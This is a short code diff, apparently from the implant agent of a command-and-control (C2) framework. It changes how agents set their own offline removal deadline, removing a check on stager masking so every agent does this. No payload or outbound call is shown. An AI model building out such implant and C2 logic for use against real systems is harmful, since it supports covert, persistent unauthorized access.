@@ -899,9 +899,9 @@ __attribute__((visibility("default"))) int main(void) {
     TRACE("[agent] gather info failed: %d\n", st);
     return 1;
   }
-  /* The agent decides its own removal deadline. A non-masked agent reports
-   * nothing and is removed as soon as its tunnel closes. */
-  if (c2_stager_mask_available()) {
+  /* Every agent decides its own removal deadline. The C2 never probes it
+   * while the agent sleeps; it keeps the record until this deadline. */
+  {
     int64_t grace = cfg.offline_grace;
     if (grace <= 0) {
       int32_t window = cfg.poll_window > 0 ? cfg.poll_window
